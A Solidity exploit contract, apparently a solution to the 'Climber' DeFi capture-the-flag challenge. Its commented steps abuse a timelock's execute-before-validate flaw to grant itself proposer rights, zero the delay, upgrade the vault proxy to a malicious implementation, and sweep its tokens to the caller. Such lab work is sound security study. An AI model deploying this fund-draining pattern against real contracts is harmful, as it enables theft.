pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import "../climber/ClimberTimelock.sol";
import "./Climberv2.sol";
contract hackClimber {
    address[] _targets;
    uint256[] _values;
    bytes[] _dataElements;
    bytes32 _salt = keccak256("HACKED");
    function proposeRole() external {
        ClimberTimelock(payable(msg.sender)).schedule(_targets, _values, _dataElements, _salt);
    }
    function hackIt(address payable _timeLockContract, address payable _climberVault, address payable _token) external {
        // Step-1 : Create the new malicious implementation of the climberVaultV2
        // In this Implementation, we make the function _setsweeper(address) public. 
        // The whole idea of the hack is to change the implementation address to this new malicious implementation using upgradeTo function of the UUPS proxy. 
    
        ClimberVaultV2 _maliciousImplementation = new ClimberVaultV2();
        // Step-2 : The execute function of timelockContract is allowed to call itself. Hence various accessControl can be passed on to the attacker. 
        // Step-2-a : Timelockcontract should first call itself and grant this contract "PROPOSER_ROLE"
        _targets.push(_timeLockContract);
        _values.push(0);
        _dataElements.push(abi.encodeWithSignature("grantRole(bytes32,address)", keccak256("PROPOSER_ROLE"), address(this)));
        
        // Step-2-b : Timelockcontract should call itself and change delay to 0, so that we can instantly execute in the same transaction. 
        _targets.push(_timeLockContract);
        _values.push(0);
        _dataElements.push(abi.encodeWithSignature("updateDelay(uint64)", uint64(0)));
        
        //Step-2-c : Timelockcontract should call the proxy address of the Climber Vault and change the implementation address to new malicious implementation. 
        _targets.push(_climberVault);
        _values.push(0);
        _dataElements.push(abi.encodeWithSignature("upgradeTo(address)", address(_maliciousImplementation)));
        
        //Step-2-d : Timelock contract should the above proposeRole() function of this contract in order to schedule this particular operation. 
        //Note : The timelock contract first calls all the required data and then checks whether or not operation should have been allowed or not. 
        // Step-2-a allows this contract access to schedule the operations and Step-2-d calls proposeRole() of this contract to schedule the operation. 
        _targets.push(address(this));
        _values.push(0);
        _dataElements.push(abi.encodeWithSignature("proposeRole()"));

        // Step-3 : Once all the data is set, execute the transaction. 

        ClimberTimelock(_timeLockContract).execute(_targets, _values, _dataElements, _salt);

        // Step-4 : The above transaction is executed. So, now climberVault implementation address will be the new malicious implementation, 
        // since setSweeper is public instead of internal. We can set the sweeper to ourselves. 
        ClimberVaultV2(_climberVault)._setSweeper(address(this));

        // Step-5 : Call the climberVault proxy contract to sweep funds. 
        ClimberVaultV2(_climberVault).sweepFunds(_token);

        // Step-6 : Transfer those funds to attacker. 
        IERC20(_token).transfer(msg.sender, IERC20(_token).balanceOf(address(this)));
    }

}
